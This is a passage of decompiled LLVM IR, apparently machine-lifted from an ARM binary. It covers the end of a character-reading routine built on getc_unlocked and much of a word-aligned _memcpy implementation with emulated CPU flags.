  %v3_18bb8 = call i32 @getc_unlocked(i16* %v1_18bb4)
  %v3_18bbc = icmp eq i32 %v3_18bb8, -1
  store i1 %v3_18bbc, i1* %cpsr_c.global-to-local, align 1
  %v8_18bbc = icmp eq i32 %v3_18bb8, -1
  store i1 %v8_18bbc, i1* %cpsr_z.global-to-local, align 1
  %v1_18bc0 = urem i32 %v3_18bb8, 256
  store i32 %v1_18bc0, i32* %r3.global-to-local, align 4
  br i1 %v3_18bbc, label %dec_label_pc_18bc8, label %dec_label_pc_18be0

dec_label_pc_18bc8:                               ; preds = %dec_label_pc_18bb4
  %v0_18bc8 = load i32, i32* @r4, align 4
  %v1_18bc8 = inttoptr i32 %v0_18bc8 to i16*
  %v2_18bc8 = load i16, i16* %v1_18bc8, align 2
  %v3_18bc8 = zext i16 %v2_18bc8 to i32
  store i32 %v3_18bc8, i32* %r3.global-to-local, align 4
  %v1_18bcc = and i32 %v3_18bc8, 8
  %v2_18bcc = icmp eq i32 %v1_18bcc, 0
  store i1 %v2_18bcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bcc, label %dec_label_pc_18bec, label %dec_label_pc_18bfc

dec_label_pc_18be0:                               ; preds = %dec_label_pc_18bb4
  %v1_18bd8 = trunc i32 %v3_18bb8 to i8
  %v2_18bd8 = load i32, i32* @r5, align 4
  %v3_18bd8 = inttoptr i32 %v2_18bd8 to i8*
  store i8 %v1_18bd8, i8* %v3_18bd8, align 1
  %v4_18bd8 = load i32, i32* @r5, align 4
  %v5_18bd8 = add i32 %v4_18bd8, 1
  store i32 %v5_18bd8, i32* @r5, align 4
  %v0_18bdc = load i32, i32* %r3.global-to-local, align 4
  %v2_18bdc = icmp ugt i32 %v0_18bdc, 9
  store i1 %v2_18bdc, i1* %cpsr_c.global-to-local, align 1
  %v7_18bdc = icmp eq i32 %v0_18bdc, 10
  store i1 %v7_18bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18bdc, label %dec_label_pc_18bec, label %dec_label_pc_18be4.backedge

dec_label_pc_18be4.backedge:                      ; preds = %dec_label_pc_18be0, %dec_label_pc_18ba0
  %v0_18be4 = load i32, i32* @r6, align 4
  %v1_18be4 = add i32 %v0_18be4, -1
  store i32 %v1_18be4, i32* @r6, align 4
  %v2_18be4 = icmp ne i32 %v0_18be4, 0
  store i1 %v2_18be4, i1* %cpsr_c.global-to-local, align 1
  %v7_18be4 = icmp eq i32 %v0_18be4, 1
  store i1 %v7_18be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18be4, label %dec_label_pc_18bec, label %dec_label_pc_18be4.backedge.dec_label_pc_18b90_crit_edge

dec_label_pc_18be4.backedge.dec_label_pc_18b90_crit_edge: ; preds = %dec_label_pc_18be4.backedge
  %v0_18b90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18b90

dec_label_pc_18bec:                               ; preds = %dec_label_pc_18be0, %dec_label_pc_18be4.backedge, %dec_label_pc_18ba0, %dec_label_pc_18be4.preheader, %dec_label_pc_18bc8
  %v0_18bec = load i32, i32* @r5, align 4
  %v1_18bec = load i32, i32* @r7, align 4
  %v3_18bec = icmp uge i32 %v0_18bec, %v1_18bec
  store i1 %v3_18bec, i1* %cpsr_c.global-to-local, align 1
  %v9_18bec = icmp eq i32 %v0_18bec, %v1_18bec
  store i1 %v9_18bec, i1* %cpsr_z.global-to-local, align 1
  %v2_18bf0 = xor i1 %v9_18bec, true
  %v3_18bf0 = and i1 %v3_18bec, %v2_18bf0
  br i1 %v3_18bf0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_18bec
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_18bf4 = inttoptr i32 %v0_18bec to i8*
  store i8 0, i8* %v7_18bf4, align 1
  %v0_18bf8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_18bf8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_18bec, %bb
  %v1_18bf8 = phi i1 [ %v1_18bf8.pre, %bb ], [ %v9_18bec, %dec_label_pc_18bec ]
  %v0_18bf8 = phi i1 [ %v0_18bf8.pre, %bb ], [ %v3_18bec, %dec_label_pc_18bec ]
  %v2_18bf8 = xor i1 %v1_18bf8, true
  %v3_18bf8 = and i1 %v0_18bf8, %v2_18bf8
  br i1 %v3_18bf8, label %.dec_label_pc_18c00_crit_edge, label %dec_label_pc_18bfc

.dec_label_pc_18c00_crit_edge:                    ; preds = %.thread14
  %v0_18c00.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18c00

dec_label_pc_18bfc:                               ; preds = %entry, %dec_label_pc_18bc8, %.thread14
  br label %dec_label_pc_18c00

dec_label_pc_18c00:                               ; preds = %.dec_label_pc_18c00_crit_edge, %dec_label_pc_18bfc
  %v0_18c00 = phi i32 [ %v0_18c00.pre, %.dec_label_pc_18c00_crit_edge ], [ 0, %dec_label_pc_18bfc ]
  store i32 %v9_18b70, i32* @r6, align 4
  store i32 %v12_18b70, i32* @r7, align 4
  ret i32 %v0_18c00

; uselistorder directives
  uselistorder i1 %v9_18bec, { 1, 0, 2 }
  uselistorder i32 %v1_18bec, { 1, 0 }
  uselistorder i32 %v0_18bec, { 0, 2, 1 }
  uselistorder i32 %v0_18be4, { 2, 0, 1 }
  uselistorder i32 %v0_18bdc, { 1, 0 }
  uselistorder i32 %v3_18bb8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_18ba8, { 1, 0 }
  uselistorder i32 %v3_18b90, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_18bb4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18c00, { 1, 0 }
  uselistorder label %dec_label_pc_18bfc, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_18bec, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_18b90, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_18c10 = load i32, i32* @r1, align 4
  %v1_18c10 = load i32, i32* @r0, align 4
  %v2_18c10 = sub i32 %v0_18c10, %v1_18c10
  %v3_18c10 = icmp ult i32 %v0_18c10, %v1_18c10
  %v4_18c10 = xor i32 %v1_18c10, %v0_18c10
  %v5_18c10 = xor i32 %v2_18c10, %v0_18c10
  %v6_18c10 = and i32 %v5_18c10, %v4_18c10
  %v7_18c10 = icmp slt i32 %v6_18c10, 0
  store i1 %v7_18c10, i1* %cpsr_v.global-to-local, align 1
  %v8_18c10 = icmp slt i32 %v2_18c10, 0
  store i1 %v8_18c10, i1* %cpsr_n.global-to-local, align 1
  %v9_18c10 = icmp eq i32 %v0_18c10, %v1_18c10
  store i1 %v9_18c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18c10, label %dec_label_pc_18e64, label %dec_label_pc_18c18

dec_label_pc_18c18:                               ; preds = %entry
  br i1 %v9_18c10, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_18c18
  %merge = phi i32 [ %v0_18c10, %dec_label_pc_18c18 ], [ %v2_18ef8, %bb150 ], [ %v11_18f14, %bb153 ], [ %v7_18f14, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_18c18
  %v5_18c1c = inttoptr i32 %v1_18c10 to i8*
  store i8* %v5_18c1c, i8** %stack_var_-8, align 4
  %v8_18c1c = load i32, i32* @lr, align 4
  %v0_18c20 = load i32, i32* @r2, align 4
  %v2_18c20 = add i32 %v0_18c20, -4
  store i32 %v2_18c20, i32* %r2.global-to-local, align 4
  %v4_18c20 = sub i32 3, %v0_18c20
  %v5_18c20 = and i32 %v4_18c20, %v0_18c20
  %v6_18c20 = icmp slt i32 %v5_18c20, 0
  store i1 %v6_18c20, i1* %cpsr_v.global-to-local, align 1
  %v7_18c20 = icmp slt i32 %v2_18c20, 0
  store i1 %v7_18c20, i1* %cpsr_n.global-to-local, align 1
  %v8_18c20 = icmp eq i32 %v0_18c20, 4
  store i1 %v8_18c20, i1* %cpsr_z.global-to-local, align 1
  %v5_18c24 = icmp slt i32 %v0_18c20, 4
  br i1 %v5_18c24, label %bb140, label %dec_label_pc_18c28

dec_label_pc_18c28:                               ; preds = %bb
  %v1_18c28 = urem i32 %v1_18c10, 4
  store i32 %v1_18c28, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18c28 = icmp eq i32 %v1_18c28, 0
  store i1 %v2_18c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c28, label %dec_label_pc_18c30, label %dec_label_pc_18cdc

dec_label_pc_18c30:                               ; preds = %dec_label_pc_18c28
  %v1_18c30 = urem i32 %v0_18c10, 4
  store i32 %v1_18c30, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18c30 = icmp eq i32 %v1_18c30, 0
  store i1 %v2_18c30, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_18c10 to i2
  br i1 %v2_18c30, label %dec_label_pc_18c38, label %dec_label_pc_18d0c

dec_label_pc_18c38:                               ; preds = %dec_label_pc_18c30, %dec_label_pc_18d04
  %v0_18c5094 = phi i32 [ %v1_18c10, %dec_label_pc_18c30 ], [ %v0_18e2c77, %dec_label_pc_18d04 ]
  %v0_18c4c93 = phi i32 [ %v0_18c10, %dec_label_pc_18c30 ], [ %v0_18d04, %dec_label_pc_18d04 ]
  %v0_18c38 = phi i32 [ %v2_18c20, %dec_label_pc_18c30 ], [ %v2_18cfc, %dec_label_pc_18d04 ]
  %v1_18c38 = add i32 %v0_18c38, -8
  store i32 %v1_18c38, i32* %r2.global-to-local, align 4
  %v3_18c38 = sub i32 7, %v0_18c38
  %v4_18c38 = and i32 %v3_18c38, %v0_18c38
  %v5_18c38 = icmp slt i32 %v4_18c38, 0
  store i1 %v5_18c38, i1* %cpsr_v.global-to-local, align 1
  %v6_18c38 = icmp slt i32 %v1_18c38, 0
  store i1 %v6_18c38, i1* %cpsr_n.global-to-local, align 1
  %v7_18c38 = icmp eq i32 %v0_18c38, 8
  store i1 %v7_18c38, i1* %cpsr_z.global-to-local, align 1
  %v2_18c3c = xor i1 %v6_18c38, %v5_18c38
  br i1 %v2_18c3c, label %dec_label_pc_18c8c, label %dec_label_pc_18c40

dec_label_pc_18c40:                               ; preds = %dec_label_pc_18c38
  %v1_18c40 = add i32 %v0_18c38, -28
  store i32 %v1_18c40, i32* %r2.global-to-local, align 4
  %v3_18c40 = sub i32 27, %v0_18c38
  %v4_18c40 = and i32 %v3_18c40, %v1_18c38
  %v5_18c40 = icmp slt i32 %v4_18c40, 0
  store i1 %v5_18c40, i1* %cpsr_v.global-to-local, align 1
  %v6_18c40 = icmp slt i32 %v1_18c40, 0
  store i1 %v6_18c40, i1* %cpsr_n.global-to-local, align 1
  %v7_18c40 = icmp eq i32 %v1_18c38, 20
  store i1 %v7_18c40, i1* %cpsr_z.global-to-local, align 1
  %v2_18c44 = xor i1 %v6_18c40, %v5_18c40
  br i1 %v2_18c44, label %dec_label_pc_18c78, label %dec_label_pc_18c48

dec_label_pc_18c48:                               ; preds = %dec_label_pc_18c40
  %v0_18c48 = load i32, i32* @r4, align 4
  store i32 %v0_18c48, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18c4c

dec_label_pc_18c4c:                               ; preds = %dec_label_pc_18c4c.dec_label_pc_18c4c_crit_edge, %dec_label_pc_18c48
  %v0_18c50 = phi i32 [ %v12_18c58, %dec_label_pc_18c4c.dec_label_pc_18c4c_crit_edge ], [ %v0_18c5094, %dec_label_pc_18c48 ]
  %v0_18c4c = phi i32 [ %v0_18c4c.pre, %dec_label_pc_18c4c.dec_label_pc_18c4c_crit_edge ], [ %v0_18c4c93, %dec_label_pc_18c48 ]
  %v1_18c4c = inttoptr i32 %v0_18c4c to i32*
  %v2_18c4c = load i32, i32* %v1_18c4c, align 4
  %v3_18c4c = add i32 %v0_18c4c, 4
  %v4_18c4c = inttoptr i32 %v3_18c4c to i32*
  %v5_18c4c = load i32, i32* %v4_18c4c, align 4
  store i32 %v5_18c4c, i32* %r4.global-to-local, align 4
  %v6_18c4c = add i32 %v0_18c4c, 8
  %v7_18c4c = inttoptr i32 %v6_18c4c to i32*
  %v8_18c4c = load i32, i32* %v7_18c4c, align 4
  store i32 %v8_18c4c, i32* %ip.global-to-local, align 4
  %v9_18c4c = add i32 %v0_18c4c, 12
  %v10_18c4c = inttoptr i32 %v9_18c4c to i32*
  %v11_18c4c = load i32, i32* %v10_18c4c, align 4
  store i32 %v11_18c4c, i32* %lr.global-to-local, align 4
  %v12_18c4c = add i32 %v0_18c4c, 16
  store i32 %v12_18c4c, i32* %r1.global-to-local, align 4
  %v1_18c50 = inttoptr i32 %v0_18c50 to i32*
  store i32 %v2_18c4c, i32* %v1_18c50, align 4
  %v3_18c50 = add i32 %v0_18c50, 4
  %v4_18c50 = inttoptr i32 %v3_18c50 to i32*
  %v5_18c50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18c50, i32* %v4_18c50, align 4
  %v6_18c50 = add i32 %v0_18c50, 8
  %v7_18c50 = inttoptr i32 %v6_18c50 to i32*
  %v8_18c50 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_18c50, i32* %v7_18c50, align 4
  %v9_18c50 = add i32 %v0_18c50, 12
  %v10_18c50 = inttoptr i32 %v9_18c50 to i32*
  %v11_18c50 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18c50, i32* %v10_18c50, align 4
  %v12_18c50 = add i32 %v0_18c50, 16
  store i32 %v12_18c50, i32* %r0.global-to-local, align 4
  %v0_18c54 = load i32, i32* %r1.global-to-local, align 4
  %v1_18c54 = inttoptr i32 %v0_18c54 to i32*
  %v2_18c54 = load i32, i32* %v1_18c54, align 4
  store i32 %v2_18c54, i32* @r3, align 4
  %v3_18c54 = add i32 %v0_18c54, 4
  %v4_18c54 = inttoptr i32 %v3_18c54 to i32*
  %v5_18c54 = load i32, i32* %v4_18c54, align 4
  store i32 %v5_18c54, i32* %r4.global-to-local, align 4
  %v6_18c54 = add i32 %v0_18c54, 8
  %v7_18c54 = inttoptr i32 %v6_18c54 to i32*
  %v8_18c54 = load i32, i32* %v7_18c54, align 4
  store i32 %v8_18c54, i32* @ip, align 4
  %v9_18c54 = add i32 %v0_18c54, 12
  %v10_18c54 = inttoptr i32 %v9_18c54 to i32*
  %v11_18c54 = load i32, i32* %v10_18c54, align 4
  store i32 %v11_18c54, i32* %lr.global-to-local, align 4
  %v12_18c54 = add i32 %v0_18c54, 16
  store i32 %v12_18c54, i32* @r1, align 4
  %v1_18c58 = inttoptr i32 %v12_18c50 to i32*
  store i32 %v2_18c54, i32* %v1_18c58, align 4
  %v3_18c58 = add i32 %v0_18c50, 20
  %v4_18c58 = inttoptr i32 %v3_18c58 to i32*
  %v5_18c58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18c58, i32* %v4_18c58, align 4
  %v6_18c58 = add i32 %v0_18c50, 24
  %v7_18c58 = inttoptr i32 %v6_18c58 to i32*
  %v8_18c58 = load i32, i32* @ip, align 4
  store i32 %v8_18c58, i32* %v7_18c58, align 4
  %v9_18c58 = add i32 %v0_18c50, 28
  %v10_18c58 = inttoptr i32 %v9_18c58 to i32*
  %v11_18c58 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18c58, i32* %v10_18c58, align 4
  %v12_18c58 = add i32 %v0_18c50, 32
  store i32 %v12_18c58, i32* @r0, align 4
  %v0_18c5c = load i32, i32* %r2.global-to-local, align 4
  %v1_18c5c = add i32 %v0_18c5c, -32
  store i32 %v1_18c5c, i32* %r2.global-to-local, align 4
  %v3_18c5c = sub i32 31, %v0_18c5c
  %v4_18c5c = and i32 %v3_18c5c, %v0_18c5c
  %v5_18c5c = icmp slt i32 %v4_18c5c, 0
  %v6_18c5c = icmp slt i32 %v1_18c5c, 0
  %v2_18c60 = xor i1 %v6_18c5c, %v5_18c5c
  br i1 %v2_18c60, label %dec_label_pc_18c64, label %dec_label_pc_18c4c.dec_label_pc_18c4c_crit_edge

dec_label_pc_18c4c.dec_label_pc_18c4c_crit_edge:  ; preds = %dec_label_pc_18c4c
  %v0_18c4c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18c4c

dec_label_pc_18c64:                               ; preds = %dec_label_pc_18c4c
  %v1_18c64 = add i32 %v0_18c5c, -16
  %v3_18c64 = add i32 %v0_18c5c, 2147483616
  %v4_18c64 = and i32 %v1_18c64, %v3_18c64
  %v5_18c64 = icmp slt i32 %v4_18c64, 0
  store i1 %v5_18c64, i1* %cpsr_v.global-to-local, align 1
  %v6_18c64 = icmp slt i32 %v1_18c64, 0
  store i1 %v6_18c64, i1* %cpsr_n.global-to-local, align 1
  %v7_18c64 = icmp eq i32 %v1_18c64, 0
  store i1 %v7_18c64, i1* %cpsr_z.global-to-local, align 1
  %v2_18c68 = xor i1 %v6_18c64, %v5_18c64
  br i1 %v2_18c68, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_18c64
  %v3_18c68 = load i32, i32* @r1, align 4
  %v4_18c68 = inttoptr i32 %v3_18c68 to i32*
  %v5_18c68 = load i32, i32* %v4_18c68, align 4
  store i32 %v5_18c68, i32* @r3, align 4
  %v6_18c68 = add i32 %v3_18c68, 4
  %v7_18c68 = inttoptr i32 %v6_18c68 to i32*
  %v8_18c68 = load i32, i32* %v7_18c68, align 4
  store i32 %v8_18c68, i32* %r4.global-to-local, align 4
  %v9_18c68 = add i32 %v3_18c68, 8
  %v10_18c68 = inttoptr i32 %v9_18c68 to i32*
  %v11_18c68 = load i32, i32* %v10_18c68, align 4
  store i32 %v11_18c68, i32* @ip, align 4
  %v12_18c68 = add i32 %v3_18c68, 12
  %v13_18c68 = inttoptr i32 %v12_18c68 to i32*
  %v14_18c68 = load i32, i32* %v13_18c68, align 4
  store i32 %v14_18c68, i32* %lr.global-to-local, align 4
  %v15_18c68 = add i32 %v3_18c68, 16
  store i32 %v15_18c68, i32* @r1, align 4
  %v4_18c6c = inttoptr i32 %v12_18c58 to i32*
  store i32 %v5_18c68, i32* %v4_18c6c, align 4
  %v6_18c6c = add i32 %v0_18c50, 36
  %v7_18c6c = inttoptr i32 %v6_18c6c to i32*
  %v8_18c6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_18c6c, i32* %v7_18c6c, align 4
  %v9_18c6c = add i32 %v0_18c50, 40
  %v10_18c6c = inttoptr i32 %v9_18c6c to i32*
  %v11_18c6c = load i32, i32* @ip, align 4
  store i32 %v11_18c6c, i32* %v10_18c6c, align 4
  %v12_18c6c = add i32 %v0_18c50, 44
  %v13_18c6c = inttoptr i32 %v12_18c6c to i32*
  %v14_18c6c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_18c6c, i32* %v13_18c6c, align 4
  %v15_18c6c = add i32 %v0_18c50, 48
  store i32 %v15_18c6c, i32* @r0, align 4
  %v3_18c70 = load i32, i32* %r2.global-to-local, align 4
  %v4_18c70 = add i32 %v3_18c70, -16
  store i32 %v4_18c70, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_18c64, %bb136
  %v3_18c80102111 = phi i32 [ %v15_18c6c, %bb136 ], [ %v12_18c58, %dec_label_pc_18c64 ]
  %v0_18c78.pre = phi i32 [ %v4_18c70, %bb136 ], [ %v1_18c5c, %dec_label_pc_18c64 ]
  %v2_18c74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18c74, i32* @r4, align 4
  br label %dec_label_pc_18c78

dec_label_pc_18c78:                               ; preds = %dec_label_pc_18c40, %bb137
  %v3_18c80101 = phi i32 [ %v0_18c5094, %dec_label_pc_18c40 ], [ %v3_18c80102111, %bb137 ]
  %v0_18c78 = phi i32 [ %v1_18c40, %dec_label_pc_18c40 ], [ %v0_18c78.pre, %bb137 ]
  %v1_18c78 = add i32 %v0_18c78, 20
  store i32 %v1_18c78, i32* %r2.global-to-local, align 4
  %v3_18c78 = sub i32 0, %v0_18c78
  %v4_18c78 = and i32 %v1_18c78, %v3_18c78
  %v5_18c78 = icmp slt i32 %v4_18c78, 0
  store i1 %v5_18c78, i1* %cpsr_v.global-to-local, align 1
  %v6_18c78 = icmp slt i32 %v1_18c78, 0
  store i1 %v6_18c78, i1* %cpsr_n.global-to-local, align 1
  %v7_18c78 = icmp eq i32 %v1_18c78, 0
  store i1 %v7_18c78, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18c7c

dec_label_pc_18c7c:                               ; preds = %.thread115, %dec_label_pc_18c78
  %v0_18c8c.pre157 = phi i32 [ %v0_18c8c.pre, %.thread115 ], [ %v1_18c78, %dec_label_pc_18c78 ]
  %v3_18c80 = phi i32 [ %v3_18c8099116, %.thread115 ], [ %v3_18c80101, %dec_label_pc_18c78 ]
  %v1_18c84 = phi i1 [ %v1_18c88, %.thread115 ], [ %v5_18c78, %dec_label_pc_18c78 ]
  %v0_18c84 = phi i1 [ %v0_18c88, %.thread115 ], [ %v6_18c78, %dec_label_pc_18c78 ]
  %v2_18c7c = xor i1 %v1_18c84, %v0_18c84
  br i1 %v2_18c7c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_18c7c
  %v3_18c7c = load i32, i32* @r1, align 4
  %v4_18c7c = inttoptr i32 %v3_18c7c to i32*
  %v5_18c7c = load i32, i32* %v4_18c7c, align 4
  store i32 %v5_18c7c, i32* @r3, align 4
  %v6_18c7c = add i32 %v3_18c7c, 4
  %v7_18c7c = inttoptr i32 %v6_18c7c to i32*
  %v8_18c7c = load i32, i32* %v7_18c7c, align 4
  store i32 %v8_18c7c, i32* @ip, align 4
  %v9_18c7c = add i32 %v3_18c7c, 8
  %v10_18c7c = inttoptr i32 %v9_18c7c to i32*
  %v11_18c7c = load i32, i32* %v10_18c7c, align 4
  store i32 %v11_18c7c, i32* %lr.global-to-local, align 4
  %v12_18c7c = add i32 %v3_18c7c, 12
  store i32 %v12_18c7c, i32* @r1, align 4
  %v4_18c80 = inttoptr i32 %v3_18c80 to i32*
  store i32 %v5_18c7c, i32* %v4_18c80, align 4
  %v6_18c80 = add i32 %v3_18c80, 4
  %v7_18c80 = inttoptr i32 %v6_18c80 to i32*
  %v8_18c80 = load i32, i32* @ip, align 4
  store i32 %v8_18c80, i32* %v7_18c80, align 4
  %v9_18c80 = add i32 %v3_18c80, 8
  %v10_18c80 = inttoptr i32 %v9_18c80 to i32*
  %v11_18c80 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18c80, i32* %v10_18c80, align 4
  %v12_18c80 = add i32 %v3_18c80, 12
  store i32 %v12_18c80, i32* @r0, align 4
  %v3_18c84 = load i32, i32* %r2.global-to-local, align 4
  %v4_18c84 = add i32 %v3_18c84, -12
  store i32 %v4_18c84, i32* %r2.global-to-local, align 4
  %v6_18c84 = sub i32 11, %v3_18c84
  %v7_18c84 = and i32 %v6_18c84, %v3_18c84
  %v8_18c84 = icmp slt i32 %v7_18c84, 0
  store i1 %v8_18c84, i1* %cpsr_v.global-to-local, align 1
  %v9_18c84 = icmp slt i32 %v4_18c84, 0
  store i1 %v9_18c84, i1* %cpsr_n.global-to-local, align 1
  %v10_18c84 = icmp eq i32 %v3_18c84, 12
  store i1 %v10_18c84, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_18c7c, %bb138
  %v0_18c8c.pre = phi i32 [ %v4_18c84, %bb138 ], [ %v0_18c8c.pre157, %dec_label_pc_18c7c ]
  %v3_18c8099116 = phi i32 [ %v12_18c80, %bb138 ], [ %v3_18c80, %dec_label_pc_18c7c ]
  %v1_18c88 = phi i1 [ %v8_18c84, %bb138 ], [ %v1_18c84, %dec_label_pc_18c7c ]
  %v0_18c88 = phi i1 [ %v9_18c84, %bb138 ], [ %v0_18c84, %dec_label_pc_18c7c ]
  %v2_18c88 = xor i1 %v1_18c88, %v0_18c88
  br i1 %v2_18c88, label %dec_label_pc_18c8c, label %dec_label_pc_18c7c

dec_label_pc_18c8c:                               ; preds = %.thread115, %dec_label_pc_18c38
  %v4_18c9c = phi i32 [ %v0_18c5094, %dec_label_pc_18c38 ], [ %v3_18c8099116, %.thread115 ]
  %v0_18c8c = phi i32 [ %v1_18c38, %dec_label_pc_18c38 ], [ %v0_18c8c.pre, %.thread115 ]
  %v1_18c8c = add i32 %v0_18c8c, 8
  store i32 %v1_18c8c, i32* %r2.global-to-local, align 4
  %v3_18c8c = sub i32 0, %v0_18c8c
  %v4_18c8c = and i32 %v1_18c8c, %v3_18c8c
  %v5_18c8c = icmp slt i32 %v4_18c8c, 0
  store i1 %v5_18c8c, i1* %cpsr_v.global-to-local, align 1
  %v6_18c8c = icmp slt i32 %v1_18c8c, 0
  store i1 %v6_18c8c, i1* %cpsr_n.global-to-local, align 1
  %v7_18c8c = icmp eq i32 %v1_18c8c, 0
  store i1 %v7_18c8c, i1* %cpsr_z.global-to-local, align 1
  %v2_18c90 = xor i1 %v6_18c8c, %v5_18c8c
  br i1 %v2_18c90, label %bb140, label %dec_label_pc_18c94

dec_label_pc_18c94:                               ; preds = %dec_label_pc_18c8c
  %v1_18c94 = add i32 %v0_18c8c, 4
  store i32 %v1_18c94, i32* %r2.global-to-local, align 4
  %v3_18c94 = sub i32 -5, %v0_18c8c
  %v4_18c94 = and i32 %v3_18c94, %v1_18c8c
  %v5_18c94 = icmp slt i32 %v4_18c94, 0
  store i1 %v5_18c94, i1* %cpsr_v.global-to-local, align 1
  %v6_18c94 = icmp slt i32 %v1_18c94, 0
  store i1 %v6_18c94, i1* %cpsr_n.global-to-local, align 1
  %v7_18c94 = icmp eq i32 %v1_18c8c, 4
  store i1 %v7_18c94, i1* %cpsr_z.global-to-local, align 1
  %v2_18c98 = xor i1 %v6_18c94, %v5_18c94
  %v3_18c98 = load i32, i32* @r1, align 4
  %v4_18c98 = inttoptr i32 %v3_18c98 to i32*
  %v5_18c98 = load i32, i32* %v4_18c98, align 4
  store i32 %v5_18c98, i32* @r3, align 4
  %v7_18c98 = add i32 %v3_18c98, 4
  br i1 %v2_18c98, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_18c94
  store i32 %v7_18c98, i32* @r1, align 4
  %v5_18c9c = inttoptr i32 %v4_18c9c to i32*
  store i32 %v5_18c98, i32* %v5_18c9c, align 4
  %v6_18c9c = load i32, i32* @r0, align 4
  %v7_18c9c = add i32 %v6_18c9c, 4
  store i32 %v7_18c9c, i32* @r0, align 4
  %v0_18cac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_18c94
  %v7_18ca0 = inttoptr i32 %v7_18c98 to i32*
  %v8_18ca0 = load i32, i32* %v7_18ca0, align 4
  store i32 %v8_18ca0, i32* @ip, align 4
  %v9_18ca0 = add i32 %v3_18c98, 8
  store i32 %v9_18ca0, i32* @r1, align 4
  %v4_18ca4 = inttoptr i32 %v4_18c9c to i32*
  store i32 %v5_18c98, i32* %v4_18ca4, align 4
  %v6_18ca4 = add i32 %v4_18c9c, 4
  %v7_18ca4 = inttoptr i32 %v6_18ca4 to i32*
  %v8_18ca4 = load i32, i32* @ip, align 4
  store i32 %v8_18ca4, i32* %v7_18ca4, align 4
  %v9_18ca4 = add i32 %v4_18c9c, 8
  store i32 %v9_18ca4, i32* @r0, align 4
  %v3_18ca8 = load i32, i32* %r2.global-to-local, align 4
  %v4_18ca8 = add i32 %v3_18ca8, -4
  store i32 %v4_18ca8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_18c8c, %bb, %dec_label_pc_18e5c, %dec_label_pc_18df0, %dec_label_pc_18d84, %bb139
  %v0_18cac = phi i32 [ %v0_18cac.pre, %.thread122 ], [ %v2_18cfc, %.thread128 ], [ %v1_18c8c, %dec_label_pc_18c8c ], [ %v2_18c20, %bb ], [ %v0_18cac61, %dec_label_pc_18e5c ], [ %v0_18cac60, %dec_label_pc_18df0 ], [ %v0_18cac59, %dec_label_pc_18d84 ], [ %v4_18ca8, %bb139 ]
  %v1_18cac = add i32 %v0_18cac, 4
  store i32 %v1_18cac, i32* %r2.global-to-local, align 4
  %v3_18cac = sub i32 0, %v0_18cac
  %v4_18cac = and i32 %v1_18cac, %v3_18cac
  %v5_18cac = icmp slt i32 %v4_18cac, 0
  store i1 %v5_18cac, i1* %cpsr_v.global-to-local, align 1
  %v6_18cac = icmp slt i32 %v1_18cac, 0
  store i1 %v6_18cac, i1* %cpsr_n.global-to-local, align 1
  %v7_18cac = icmp eq i32 %v1_18cac, 0
